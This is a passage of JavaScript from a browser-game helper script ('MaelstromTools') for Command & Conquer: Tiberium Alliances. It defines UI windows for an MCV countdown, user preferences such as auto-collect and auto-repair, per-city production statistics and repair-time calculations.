                      y : base.mcvPopupY 
                    }); 
                  }); 
                  var font = qx.bom.Font.fromString('bold').set({ 
                    size: 20 
                  }); 
 
                  this.mcvTimerLabel = new qx.ui.basic.Label().set({ 
                    font: font, 
                    textColor: 'red', 
                    width: 155, 
                    textAlign: 'center', 
                    marginBottom : 5 
                  }); 
                  this.mcvPopup.add(this.mcvTimerLabel); 
                  var serverBar = qx.core.Init.getApplication().getServerBar().getBounds(); 
                  var pos = MaelstromTools.LocalStorage.get("mcvPopup", { 
                      x : serverBar.width + 150, 
                      y : 70 
                    }); 
                  this.mcvPopupX = pos.x; 
                  this.mcvPopupY = pos.y; 
                  this.mcvPopup.open(); 
                } 
                var size = qx.core.Init.getApplication().getRoot().getBounds(); 
                this.mcvPopup.moveTo(size.width - this.mcvPopupX, size.height - this.mcvPopupY); 
 
                var nextLevelInfo = cd.get_NextLevelInfo_Obj(); 
                var resourcesNeeded = new Array(); 
                for (var i in nextLevelInfo.rr) { 
                  if (nextLevelInfo.rr[i].t > 0) { 
                    resourcesNeeded[nextLevelInfo.rr[i].t] = nextLevelInfo.rr[i].c; 
                  } 
                } 
                //var researchNeeded = resourcesNeeded[ClientLib.Base.EResourceType.ResearchPoints]; 
                //var currentResearchPoints = player.get_ResearchPoints(); 
 
                var creditsNeeded = resourcesNeeded[ClientLib.Base.EResourceType.Gold]; 
                var creditsResourceData = player.get_Credits(); 
                var creditGrowthPerHour = (creditsResourceData.Delta + creditsResourceData.ExtraBonusDelta) * ClientLib.Data.MainData.GetInstance().get_Time().get_StepsPerHour(); 
                var creditTimeLeftInHours = (creditsNeeded - player.GetCreditsCount()) / creditGrowthPerHour; 
 
                if (creditGrowthPerHour == 0 || creditTimeLeftInHours <= 0) { 
                  if (this.mcvPopup) { 
                    this.mcvPopup.close(); 
                  } 
                  return; 
                } 
 
                this.mcvPopup.setCaption(Lang.gt("Next MCV") + " ($ " + MaelstromTools.Wrapper.FormatNumbersCompact(creditsNeeded) + ")"); 
                this.mcvTimerLabel.setValue(MaelstromTools.Wrapper.FormatTimespan(creditTimeLeftInHours * 60 * 60)); 
 
                if (!this.mcvPopup.isVisible()) { 
                  this.mcvPopup.open(); 
                } 
              } catch (e) { 
                console.log("calculateCostsForNextMCV", e); 
              } 
            } 
          } 
        }); 
 
        // define Preferences 
        qx.Class.define("MaelstromTools.Preferences", { 
          type: "singleton", 
          extend: qx.core.Object, 
 
          statics: { 
            USEDEDICATEDMAINMENU: "useDedicatedMainMenu", 
            AUTOCOLLECTPACKAGES: "autoCollectPackages", 
            AUTOREPAIRUNITS: "autoRepairUnits", 
            AUTOREPAIRBUILDINGS: "autoRepairBuildings", 
            AUTOHIDEMISSIONTRACKER: "autoHideMissionTracker", 
            AUTOCOLLECTTIMER: "AutoCollectTimer", 
            SHOWLOOT: "showLoot", 
            SHOWCOSTSFORNEXTMCV: "showCostsForNextMCV", 
            CHATHISTORYLENGTH: "ChatHistoryLength" 
          }, 
 
          members: { 
            Window: null, 
            Widget: null, 
            Settings: null, 
            FormElements: null, 
 
            readOptions: function () { 
              try { 
                if (!this.Settings) { 
                  this.Settings = new Object(); 
                } 
 
                /* 
                if(MaelstromTools.LocalStorage.get("useDedicatedMainMenu") == null) { 
                  if(qx.bom.Viewport.getWidth(window) > 1800) { 
                    this.Settings["useDedicatedMainMenu"] = false; 
                  } 
                } else { 
                  this.Settings["useDedicatedMainMenu"] = (MaelstromTools.LocalStorage.get("useDedicatedMainMenu", 1) == 1); 
                }*/ 
                this.Settings[MaelstromTools.Preferences.USEDEDICATEDMAINMENU] = (MaelstromTools.LocalStorage.get(MaelstromTools.Preferences.USEDEDICATEDMAINMENU, 1) == 1); 
                this.Settings[MaelstromTools.Preferences.AUTOCOLLECTPACKAGES] = (MaelstromTools.LocalStorage.get(MaelstromTools.Preferences.AUTOCOLLECTPACKAGES, 0) == 1); 
                this.Settings[MaelstromTools.Preferences.AUTOREPAIRUNITS] = (MaelstromTools.LocalStorage.get(MaelstromTools.Preferences.AUTOREPAIRUNITS, 0) == 1); 
                this.Settings[MaelstromTools.Preferences.AUTOREPAIRBUILDINGS] = (MaelstromTools.LocalStorage.get(MaelstromTools.Preferences.AUTOREPAIRBUILDINGS, 0) == 1); 
                this.Settings[MaelstromTools.Preferences.AUTOHIDEMISSIONTRACKER] = (MaelstromTools.LocalStorage.get(MaelstromTools.Preferences.AUTOHIDEMISSIONTRACKER, 0) == 1); 
                this.Settings[MaelstromTools.Preferences.AUTOCOLLECTTIMER] = MaelstromTools.LocalStorage.get(MaelstromTools.Preferences.AUTOCOLLECTTIMER, 60); 
                this.Settings[MaelstromTools.Preferences.SHOWLOOT] = (MaelstromTools.LocalStorage.get(MaelstromTools.Preferences.SHOWLOOT, 1) == 1); 
                this.Settings[MaelstromTools.Preferences.SHOWCOSTSFORNEXTMCV] = (MaelstromTools.LocalStorage.get(MaelstromTools.Preferences.SHOWCOSTSFORNEXTMCV, 1) == 1); 
                this.Settings[MaelstromTools.Preferences.CHATHISTORYLENGTH] = MaelstromTools.LocalStorage.get(MaelstromTools.Preferences.CHATHISTORYLENGTH, 64); 
 
                if (!CCTAWrapperIsInstalled()) { 
                  this.Settings[MaelstromTools.Preferences.AUTOREPAIRUNITS] = false; 
                  this.Settings[MaelstromTools.Preferences.AUTOREPAIRBUILDINGS] = false; 
                  //this.Settings[MaelstromTools.Preferences.SHOWLOOT] = false; 
                } 
                //console.log(this.Settings); 
 
              } catch (e) { 
                console.log("MaelstromTools.Preferences.readOptions: ", e); 
              } 
            }, 
 
            openWindow: function (WindowName, WindowTitle) { 
              try { 
                if (!this.Window) { 
                  //this.Window = new qx.ui.window.Window(WindowTitle).set({ 
                  this.Window = new webfrontend.gui.OverlayWindow().set({ 
                    autoHide: false, 
                    title: WindowTitle, 
                    minHeight: 350 
 
                    //resizable: false, 
                    //showMaximize:false, 
                    //showMinimize:false, 
                    //allowMaximize:false, 
                    //allowMinimize:false, 
                    //showStatusbar: false 
                  }); 
                  this.Window.clientArea.setPadding(10); 
                  this.Window.clientArea.setLayout(new qx.ui.layout.VBox(3)); 
 
                  this.Widget = new qx.ui.container.Composite(new qx.ui.layout.Grid().set({ 
                    spacingX: 5, 
                    spacingY: 5 
                  })); 
 
                  //this.Widget.setTextColor("white"); 
 
                  this.Window.clientArea.add(this.Widget); 
                } 
 
                if (this.Window.isVisible()) { 
                  this.Window.close(); 
                } else { 
                  MT_Base.openWindow(this.Window, WindowName); 
                  this.setWidgetLabels(); 
                } 
              } catch (e) { 
                console.log("MaelstromTools.Preferences.openWindow: ", e); 
              } 
            }, 
 
            addFormElement: function (name, element) { 
              this.FormElements[name] = element; 
            }, 
 
            setWidgetLabels: function () { 
              try { 
                this.readOptions(); 
 
                this.FormElements = new Object(); 
                this.Widget.removeAll(); 
                var rowIdx = 1; 
                var colIdx = 1; 
 
                var chkAutoHideMissionTracker = new qx.ui.form.CheckBox(Lang.gt("Hide Mission Tracker")).set({ 
                  value: this.Settings[MaelstromTools.Preferences.AUTOHIDEMISSIONTRACKER] == 1 
                }); 
                var chkUseDedicatedMainMenu = new qx.ui.form.CheckBox(Lang.gt("Use dedicated Main Menu (restart required)")).set({ 
                  value: this.Settings[MaelstromTools.Preferences.USEDEDICATEDMAINMENU] == 1 
                }); 
                var chkShowLoot = new qx.ui.form.CheckBox(Lang.gt("Show lootable resources (restart required)")).set({ 
                  value: this.Settings[MaelstromTools.Preferences.SHOWLOOT] == 1/*, 
                  enabled: CCTAWrapperIsInstalled()*/ 
                }); 
                var chkCostsNextMCV = new qx.ui.form.CheckBox(Lang.gt("Show time to next MCV")).set({ 
                  value: this.Settings[MaelstromTools.Preferences.SHOWCOSTSFORNEXTMCV] == 1 
                }); 
                MaelstromTools.Util.addElement(this.Widget, rowIdx++, colIdx, chkAutoHideMissionTracker, 2); 
                MaelstromTools.Util.addElement(this.Widget, rowIdx++, colIdx, chkUseDedicatedMainMenu, 2); 
                MaelstromTools.Util.addElement(this.Widget, rowIdx++, colIdx, chkShowLoot, 2); 
                MaelstromTools.Util.addElement(this.Widget, rowIdx++, colIdx, chkCostsNextMCV, 2); 
 
                var chkAutoCollectPackages = new qx.ui.form.CheckBox(Lang.gt("Autocollect packages")).set({ 
                  value: this.Settings[MaelstromTools.Preferences.AUTOCOLLECTPACKAGES] == 1 
                }); 
                var chkAutoRepairUnits = new qx.ui.form.CheckBox(Lang.gt("Autorepair units")).set({ 
                  value: this.Settings[MaelstromTools.Preferences.AUTOREPAIRUNITS] == 1, 
                  enabled: CCTAWrapperIsInstalled() 
                }); 
                var chkAutoRepairBuildings = new qx.ui.form.CheckBox(Lang.gt("Autorepair buildings")).set({ 
                  value: this.Settings[MaelstromTools.Preferences.AUTOREPAIRBUILDINGS] == 1, 
                  enabled: CCTAWrapperIsInstalled() 
                }); 
 
                var spinnerChatHistoryLength = new qx.ui.form.Spinner().set({ 
                  minimum: 64, 
                  maximum: 512, 
                  value: this.Settings[MaelstromTools.Preferences.CHATHISTORYLENGTH] 
                }); 
 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx, Lang.gt("Chat history length") + " (" + spinnerChatHistoryLength.getMinimum() + " - " + spinnerChatHistoryLength.getMaximum() + ")"); 
                MaelstromTools.Util.addElement(this.Widget, rowIdx++, colIdx + 1, spinnerChatHistoryLength); 
 
                var spinnerAutoCollectTimer = new qx.ui.form.Spinner().set({ 
                  minimum: 5, 
                  maximum: 60 * 6, 
                  value: this.Settings[MaelstromTools.Preferences.AUTOCOLLECTTIMER] 
                }); 
 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx, Lang.gt("Automatic interval in minutes") + " (" + spinnerAutoCollectTimer.getMinimum() + " - " + spinnerAutoCollectTimer.getMaximum() + ")"); 
                MaelstromTools.Util.addElement(this.Widget, rowIdx++, colIdx + 1, spinnerAutoCollectTimer); 
                MaelstromTools.Util.addElement(this.Widget, rowIdx++, colIdx, chkAutoCollectPackages, 2); 
                MaelstromTools.Util.addElement(this.Widget, rowIdx++, colIdx, chkAutoRepairUnits, 2); 
                MaelstromTools.Util.addElement(this.Widget, rowIdx++, colIdx, chkAutoRepairBuildings, 2); 
 
                var applyButton = new qx.ui.form.Button(Lang.gt("Apply changes")).set({ 
                  appearance: "button-detailview-small", 
                  width: 120, 
                  minWidth: 120, 
                  maxWidth: 120 
                }); 
                applyButton.addListener("execute", this.applyChanges, this); 
 
                var cancelButton = new qx.ui.form.Button(Lang.gt("Discard changes")).set({ 
                  appearance: "button-detailview-small", 
                  width: 120, 
                  minWidth: 120, 
                  maxWidth: 120 
                }); 
                cancelButton.addListener("execute", function () { 
                  this.Window.close(); 
                }, this); 
 
                var resetButton = new qx.ui.form.Button(Lang.gt("Reset to default")).set({ 
                  appearance: "button-detailview-small", 
                  width: 120, 
                  minWidth: 120, 
                  maxWidth: 120 
                }); 
                resetButton.addListener("execute", this.resetToDefault, this); 
 
                MaelstromTools.Util.addElement(this.Widget, rowIdx++, colIdx, resetButton); 
                colIdx = 1; 
                MaelstromTools.Util.addElement(this.Widget, rowIdx, colIdx++, cancelButton); 
                MaelstromTools.Util.addElement(this.Widget, rowIdx++, colIdx, applyButton); 
 
                this.addFormElement(MaelstromTools.Preferences.AUTOHIDEMISSIONTRACKER, chkAutoHideMissionTracker); 
                this.addFormElement(MaelstromTools.Preferences.USEDEDICATEDMAINMENU, chkUseDedicatedMainMenu); 
                this.addFormElement(MaelstromTools.Preferences.SHOWLOOT, chkShowLoot); 
                this.addFormElement(MaelstromTools.Preferences.SHOWCOSTSFORNEXTMCV, chkCostsNextMCV); 
                this.addFormElement(MaelstromTools.Preferences.AUTOCOLLECTPACKAGES, chkAutoCollectPackages); 
                this.addFormElement(MaelstromTools.Preferences.AUTOREPAIRUNITS, chkAutoRepairUnits); 
                this.addFormElement(MaelstromTools.Preferences.AUTOREPAIRBUILDINGS, chkAutoRepairBuildings); 
                this.addFormElement(MaelstromTools.Preferences.AUTOCOLLECTTIMER, spinnerAutoCollectTimer); 
                this.addFormElement(MaelstromTools.Preferences.CHATHISTORYLENGTH, spinnerChatHistoryLength); 
              } catch (e) { 
                console.log("MaelstromTools.Preferences.setWidgetLabels: ", e); 
              } 
            }, 
 
            applyChanges: function () { 
              try { 
                var autoRunNeeded = false; 
                for (var idx in this.FormElements) { 
                  var element = this.FormElements[idx]; 
                  if (idx == MaelstromTools.Preferences.AUTOCOLLECTTIMER) { 
                    autoRunNeeded = (MaelstromTools.LocalStorage.get(MaelstromTools.Preferences.AUTOCOLLECTTIMER, 0) != element.getValue()); 
                  } 
                  if (idx == MaelstromTools.Preferences.CHATHISTORYLENGTH) { 
                    webfrontend.gui.chat.ChatWidget.recvbufsize = element.getValue(); 
                  } 
                  MaelstromTools.LocalStorage.set(idx, element.getValue()); 
                } 
                this.readOptions(); 
                if (autoRunNeeded) { 
                  MT_Base.runAutoCollectTimer(); 
                } 
                this.Window.close(); 
              } catch (e) { 
                console.log("MaelstromTools.Preferences.applyChanges: ", e); 
              } 
            }, 
 
            resetToDefault: function () { 
              try { 
                MaelstromTools.LocalStorage.clearAll(); 
                this.setWidgetLabels(); 
              } catch (e) { 
                console.log("MaelstromTools.Preferences.resetToDefault: ", e); 
              } 
            } 
          } 
        }); 
 
        // define DefaultObject 
        qx.Class.define("MaelstromTools.DefaultObject", { 
          type: "abstract", 
          extend: qx.core.Object, 
          members: { 
            Window: null, 
            Widget: null, 
            Cache: {}, //k null 
            IsTimerEnabled: true, 
 
            calc: function () { 
              try { 
                if (this.Window.isVisible()) { 
                  this.updateCache(); 
                  this.setWidgetLabels(); 
                  if (this.IsTimerEnabled) { 
                    var self = this; 
                    window.setTimeout(function () { 
                      self.calc(); 
                    }, MT_Base.timerInterval); 
                  } 
                } 
              } catch (e) { 
                console.log("MaelstromTools.DefaultObject.calc: ", e); 
              } 
            }, 
 
            openWindow: function (WindowName, WindowTitle) { 
              try { 
                if (!this.Window) { 
                  this.Window = new qx.ui.window.Window(WindowTitle).set({ 
                    resizable: false, 
                    showMaximize: false, 
                    showMinimize: false, 
                    allowMaximize: false, 
                    allowMinimize: false, 
                    showStatusbar: false 
                  }); 
                  this.Window.setPadding(10); 
                  this.Window.setLayout(new qx.ui.layout.VBox(3)); 
 
                  this.Widget = new qx.ui.container.Composite(new qx.ui.layout.Grid()); 
                  this.Widget.setTextColor("white"); 
 
                  this.Window.add(this.Widget); 
                } 
 
                if (this.Window.isVisible()) { 
                  this.Window.close(); 
                } else { 
                  MT_Base.openWindow(this.Window, WindowName); 
                  this.calc(); 
                } 
              } catch (e) { 
                console.log("MaelstromTools.DefaultObject.openWindow: ", e); 
              } 
            } 
          } 
        }); 
 
        // define Production 
        qx.Class.define("MaelstromTools.Production", { 
          type: "singleton", 
          extend: MaelstromTools.DefaultObject, 
          members: { 
            updateCache: function (onlyForCity) { 
              try { 
                MT_Cache.updateCityCache(); 
                var alliance = ClientLib.Data.MainData.GetInstance().get_Alliance(); 
                //this.Cache = Object(); 
 
                for (var cname in MT_Cache.Cities) { 
                  if (onlyForCity != null && onlyForCity != cname) { 
                    continue; 
                  } 
                  var ncity = MT_Cache.Cities[cname].Object; 
                  if (typeof (this.Cache[cname]) !== 'object') this.Cache[cname] = {}; 
                  if (typeof (this.Cache[cname][MaelstromTools.Statics.Tiberium]) !== 'object') this.Cache[cname][MaelstromTools.Statics.Tiberium] = {}; // all have to be checked,  
                  if (typeof (this.Cache[cname][MaelstromTools.Statics.Crystal]) !== 'object') this.Cache[cname][MaelstromTools.Statics.Crystal] = {}; // this.Cache[cname] can be created inside different namespaces 
                  if (typeof (this.Cache[cname][MaelstromTools.Statics.Power]) !== 'object') this.Cache[cname][MaelstromTools.Statics.Power] = {}; // like the RepairTime etc... without those objs 
                  if (typeof (this.Cache[cname][MaelstromTools.Statics.Dollar]) !== 'object') this.Cache[cname][MaelstromTools.Statics.Dollar] = {}; 
 
                  this.Cache[cname]["ProductionStopped"] = ncity.get_IsGhostMode(); 
                  this.Cache[cname]["PackagesStopped"] = (ncity.get_hasCooldown() || ncity.get_IsGhostMode()); 
                  this.Cache[cname][MaelstromTools.Statics.Tiberium]["Delta"] = ncity.GetResourceGrowPerHour(ClientLib.Base.EResourceType.Tiberium, false, false); // (production.d[ClientLib.Base.EResourceType.Tiberium]['Delta'] * serverTime.get_StepsPerHour()); 
                  this.Cache[cname][MaelstromTools.Statics.Tiberium]["ExtraBonusDelta"] = ncity.GetResourceBonusGrowPerHour(ClientLib.Base.EResourceType.Tiberium); //(production.d[ClientLib.Base.EResourceType.Tiberium]['ExtraBonusDelta'] * serverTime.get_StepsPerHour()); 
                  this.Cache[cname][MaelstromTools.Statics.Tiberium]["POI"] = alliance.GetPOIBonusFromResourceType(ClientLib.Base.EResourceType.Tiberium); 
                  this.Cache[cname][MaelstromTools.Statics.Crystal]["Delta"] = ncity.GetResourceGrowPerHour(ClientLib.Base.EResourceType.Crystal, false, false); //(production.d[ClientLib.Base.EResourceType.Crystal]['Delta'] * serverTime.get_StepsPerHour()); 
                  this.Cache[cname][MaelstromTools.Statics.Crystal]["ExtraBonusDelta"] = ncity.GetResourceBonusGrowPerHour(ClientLib.Base.EResourceType.Crystal); //(production.d[ClientLib.Base.EResourceType.Crystal]['ExtraBonusDelta'] * serverTime.get_StepsPerHour()); 
                  this.Cache[cname][MaelstromTools.Statics.Crystal]["POI"] = alliance.GetPOIBonusFromResourceType(ClientLib.Base.EResourceType.Crystal); 
                  this.Cache[cname][MaelstromTools.Statics.Power]["Delta"] = ncity.GetResourceGrowPerHour(ClientLib.Base.EResourceType.Power, false, false); //(production.d[ClientLib.Base.EResourceType.Power]['Delta'] * serverTime.get_StepsPerHour()); 
                  this.Cache[cname][MaelstromTools.Statics.Power]["ExtraBonusDelta"] = ncity.GetResourceBonusGrowPerHour(ClientLib.Base.EResourceType.Power); // (production.d[ClientLib.Base.EResourceType.Power]['ExtraBonusDelta'] * serverTime.get_StepsPerHour()); 
                  this.Cache[cname][MaelstromTools.Statics.Power]["POI"] = alliance.GetPOIBonusFromResourceType(ClientLib.Base.EResourceType.Power); 
                  this.Cache[cname][MaelstromTools.Statics.Dollar]["Delta"] = ClientLib.Base.Resource.GetResourceGrowPerHour(ncity.get_CityCreditsProduction(), false); // (ncity.get_CityCreditsProduction()['Delta'] * serverTime.get_StepsPerHour()); 
                  this.Cache[cname][MaelstromTools.Statics.Dollar]["ExtraBonusDelta"] = ClientLib.Base.Resource.GetResourceBonusGrowPerHour(ncity.get_CityCreditsProduction(), false); // (ncity.get_CityCreditsProduction()['ExtraBonusDelta'] * serverTime.get_StepsPerHour()); 
                  this.Cache[cname][MaelstromTools.Statics.Dollar]["POI"] = 0; 
                  this.Cache[cname]["BaseLevel"] = MaelstromTools.Wrapper.GetBaseLevel(ncity); 
                  if (onlyForCity != null && onlyForCity == cname) return this.Cache[cname]; 
                } 
              } catch (e) { 
                console.log("MaelstromTools.Production.updateCache: ", e); 
              } 
            }, 
 
            createProductionLabels2: function (rowIdx, colIdx, cityName, resourceType) { 
              try { 
                if (cityName == "-Total-") { 
                  var Totals = Object(); 
                  Totals["Delta"] = 0; 
                  Totals["ExtraBonusDelta"] = 0; 
                  Totals["POI"] = 0; 
                  Totals["Total"] = 0; 
 
                  for (var cname in this.Cache) { 
                    Totals["Delta"] += this.Cache[cname][resourceType]['Delta']; 
                    Totals["ExtraBonusDelta"] += this.Cache[cname][resourceType]['ExtraBonusDelta']; 
                    Totals["POI"] += this.Cache[cname][resourceType]['POI']; 
                  } 
                  Totals["Total"] = Totals['Delta'] + Totals['ExtraBonusDelta'] + Totals['POI']; 
 
                  rowIdx++; 
 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, MaelstromTools.Wrapper.FormatNumbersCompact(Totals['Delta']), 80, 'right', 'bold'); 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, MaelstromTools.Wrapper.FormatNumbersCompact(Totals['ExtraBonusDelta']), 80, 'right', 'bold'); 
                  if (resourceType != MaelstromTools.Statics.Dollar) { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, MaelstromTools.Wrapper.FormatNumbersCompact(Totals['POI']), 80, 'right', 'bold'); 
                  } else { 
                    rowIdx++; 
                  } 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, MaelstromTools.Wrapper.FormatNumbersCompact(Totals['Total']), 80, 'right', 'bold'); 
                } else if (cityName == "-Labels-") { 
                  MaelstromTools.Util.addImage(this.Widget, rowIdx++, colIdx, MaelstromTools.Util.getImage(resourceType)); 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, "Continuous", 100, 'left'); 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, "Bonus", 100, 'left'); 
                  if (resourceType != MaelstromTools.Statics.Dollar) { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, "POI", 100, 'left'); 
                  } else { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, "Total / BaseLevel", 100, 'left'); 
                  } 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, "Total / h", 100, 'left'); 
                } else { 
                  var cityCache = this.Cache[cityName]; 
                  if (rowIdx > 2) { 
                    rowIdx++; 
                  } 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[resourceType]['Delta']), 80, 'right', null, ((cityCache["ProductionStopped"] || cityCache[resourceType]['Delta'] == 0) ? "red" : "white")); 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[resourceType]['ExtraBonusDelta']), 80, 'right', null, ((cityCache["PackagesStopped"] || cityCache[resourceType]['ExtraBonusDelta'] == 0) ? "red" : "white")); 
                  if (resourceType != MaelstromTools.Statics.Dollar) { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[resourceType]['POI']), 80, 'right', null, (cityCache[resourceType]['POI'] == 0 ? "red" : "white")); 
                  } else { 
                    MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, MaelstromTools.Wrapper.FormatNumbersCompact((cityCache[resourceType]['Delta'] + cityCache[resourceType]['ExtraBonusDelta'] + cityCache[resourceType]['POI']) / cityCache["BaseLevel"]), 80, 'right'); 
                  } 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, MaelstromTools.Wrapper.FormatNumbersCompact(cityCache[resourceType]['Delta'] + cityCache[resourceType]['ExtraBonusDelta'] + cityCache[resourceType]['POI']), 80, 'right', 'bold'); 
                } 
                return rowIdx; 
              } catch (e) { 
                console.log("MaelstromTools.Production.createProductionLabels2: ", e); 
              } 
            }, 
 
            setWidgetLabels: function () { 
              try { 
                this.Widget.removeAll(); 
 
                var rowIdx = 1; 
                var colIdx = 1; 
 
                rowIdx = this.createProductionLabels2(rowIdx, colIdx, "-Labels-", MaelstromTools.Statics.Tiberium); 
                rowIdx = this.createProductionLabels2(rowIdx, colIdx, "-Labels-", MaelstromTools.Statics.Crystal); 
                rowIdx = this.createProductionLabels2(rowIdx, colIdx, "-Labels-", MaelstromTools.Statics.Power); 
                rowIdx = this.createProductionLabels2(rowIdx, colIdx, "-Labels-", MaelstromTools.Statics.Dollar); 
 
                colIdx++; 
                for (var cityName in this.Cache) { 
                  rowIdx = 1; 
                  MaelstromTools.Util.addLabel(this.Widget, rowIdx++, colIdx, cityName, 80, 'right'); 
 
                  rowIdx = this.createProductionLabels2(rowIdx, colIdx, cityName, MaelstromTools.Statics.Tiberium); 
                  rowIdx = this.createProductionLabels2(rowIdx, colIdx, cityName, MaelstromTools.Statics.Crystal); 
                  rowIdx = this.createProductionLabels2(rowIdx, colIdx, cityName, MaelstromTools.Statics.Power); 
                  rowIdx = this.createProductionLabels2(rowIdx, colIdx, cityName, MaelstromTools.Statics.Dollar); 
 
                  MaelstromTools.Util.addElement(this.Widget, rowIdx, colIdx++, MaelstromTools.Util.getAccessBaseButton(cityName)); 
                } 
 
                rowIdx = 1; 
                MaelstromTools.Util.addLabel(this.Widget, rowIdx, colIdx, "Total / h", 80, 'right', 'bold'); 
 
                rowIdx = this.createProductionLabels2(rowIdx, colIdx, "-Total-", MaelstromTools.Statics.Tiberium); 
                rowIdx = this.createProductionLabels2(rowIdx, colIdx, "-Total-", MaelstromTools.Statics.Crystal); 
                rowIdx = this.createProductionLabels2(rowIdx, colIdx, "-Total-", MaelstromTools.Statics.Power); 
                rowIdx = this.createProductionLabels2(rowIdx, colIdx, "-Total-", MaelstromTools.Statics.Dollar); 
              } catch (e) { 
                console.log("MaelstromTools.Production.setWidgetLabels: ", e); 
              } 
            } 
          } 
        }); 
 
        // define RepairTime 
        qx.Class.define("MaelstromTools.RepairTime", { 
          type: "singleton", 
          extend: MaelstromTools.DefaultObject, 
          members: { 
 
            updateCache: function () { 
              try { 
                MT_Cache.updateCityCache(); 
                this.Cache = Object(); 
 
                for (var cname in MT_Cache.Cities) { 
                  var ncity = MT_Cache.Cities[cname].Object; 
                  var RepLargest = ''; 
 
                  this.Cache[cname] = Object(); 
                  this.Cache[cname]["RepairTime"] = Object(); 
                  this.Cache[cname]["Repaircharge"] = Object(); 
                  this.Cache[cname]["Repaircharge"]["Smallest"] = 999999999; 
                  this.Cache[cname]["RepairTime"]["Largest"] = 0; 
 
                  this.Cache[cname]["RepairTime"][MaelstromTools.Statics.Infantry] = ncity.get_CityUnitsData().GetRepairTimeFromEUnitGroup(ClientLib.Data.EUnitGroup.Infantry, false); 
                  this.Cache[cname]["RepairTime"][MaelstromTools.Statics.Vehicle] = ncity.get_CityUnitsData().GetRepairTimeFromEUnitGroup(ClientLib.Data.EUnitGroup.Vehicle, false); 
                  this.Cache[cname]["RepairTime"][MaelstromTools.Statics.Aircraft] = ncity.get_CityUnitsData().GetRepairTimeFromEUnitGroup(ClientLib.Data.EUnitGroup.Aircraft, false); 
                  this.Cache[cname]["RepairTime"]["Maximum"] = ncity.GetResourceMaxStorage(ClientLib.Base.EResourceType.RepairChargeInf); 
                  this.Cache[cname]["Repaircharge"][MaelstromTools.Statics.Infantry] = ncity.GetResourceCount(ClientLib.Base.EResourceType.RepairChargeInf); 
                  this.Cache[cname]["Repaircharge"][MaelstromTools.Statics.Vehicle] = ncity.GetResourceCount(ClientLib.Base.EResourceType.RepairChargeVeh); 
                  this.Cache[cname]["Repaircharge"][MaelstromTools.Statics.Aircraft] = ncity.GetResourceCount(ClientLib.Base.EResourceType.RepairChargeAir); 
 
                  if (this.Cache[cname]["Repaircharge"][MaelstromTools.Statics.Infantry] < this.Cache[cname]["Repaircharge"]["Smallest"]) { 
                    this.Cache[cname]["Repaircharge"]["Smallest"] = this.Cache[cname]["Repaircharge"][MaelstromTools.Statics.Infantry]; 
                  } 
                  if (this.Cache[cname]["Repaircharge"][MaelstromTools.Statics.Vehicle] < this.Cache[cname]["Repaircharge"]["Smallest"]) { 
                    this.Cache[cname]["Repaircharge"]["Smallest"] = this.Cache[cname]["Repaircharge"][MaelstromTools.Statics.Vehicle]; 
                  } 
                  if (this.Cache[cname]["Repaircharge"][MaelstromTools.Statics.Aircraft] < this.Cache[cname]["Repaircharge"]["Smallest"]) { 
                    this.Cache[cname]["Repaircharge"]["Smallest"] = this.Cache[cname]["Repaircharge"][MaelstromTools.Statics.Aircraft]; 
                  } 
 
                  if (this.Cache[cname]["RepairTime"][MaelstromTools.Statics.Infantry] > this.Cache[cname]["RepairTime"]["Largest"]) { 
                    this.Cache[cname]["RepairTime"]["Largest"] = this.Cache[cname]["RepairTime"][MaelstromTools.Statics.Infantry]; 
                    RepLargest = "Infantry"; 
                  } 
                  if (this.Cache[cname]["RepairTime"][MaelstromTools.Statics.Vehicle] > this.Cache[cname]["RepairTime"]["Largest"]) { 
                    this.Cache[cname]["RepairTime"]["Largest"] = this.Cache[cname]["RepairTime"][MaelstromTools.Statics.Vehicle]; 
                    RepLargest = "Vehicle"; 
                  } 
                  if (this.Cache[cname]["RepairTime"][MaelstromTools.Statics.Aircraft] > this.Cache[cname]["RepairTime"]["Largest"]) { 
                    this.Cache[cname]["RepairTime"]["Largest"] = this.Cache[cname]["RepairTime"][MaelstromTools.Statics.Aircraft]; 
                    RepLargest = "Aircraft"; 
                  } 
 
                  //PossibleAttacks and MaxAttacks fixes 
                  var offHealth = ncity.GetOffenseConditionInPercent(); 
                  if (RepLargest !== '') { 
                    this.Cache[cname]["RepairTime"]["LargestDiv"] = this.Cache[cname]["RepairTime"][RepLargest]; 
                    var i = Math.ceil(this.Cache[cname]["Repaircharge"].Smallest / this.Cache[cname]["RepairTime"].LargestDiv); //fix 
                    var j = this.Cache[cname]["Repaircharge"].Smallest / this.Cache[cname]["RepairTime"].LargestDiv; 
                    if (offHealth !== 100) { i--; i += '*';} // Decrease number of attacks by 1 when unit unhealthy. Additional visual info: asterisk when units aren't healthy 
                    this.Cache[cname]["RepairTime"]["PossibleAttacks"] = i; 
                    var k = this.Cache[cname]["RepairTime"].Maximum / this.Cache[cname]["RepairTime"].LargestDiv; 
                    this.Cache[cname]["RepairTime"]["MaxAttacks"] = Math.ceil(k); //fix 
                  } else { 
                    this.Cache[cname]["RepairTime"]["LargestDiv"] = 0; 
                    this.Cache[cname]["RepairTime"]["PossibleAttacks"] = 0; 
                    this.Cache[cname]["RepairTime"]["MaxAttacks"] = 0; 
                  } 
 
                  var unitsData = ncity.get_CityUnitsData(); 
                  this.Cache[cname]["Base"] = Object(); 
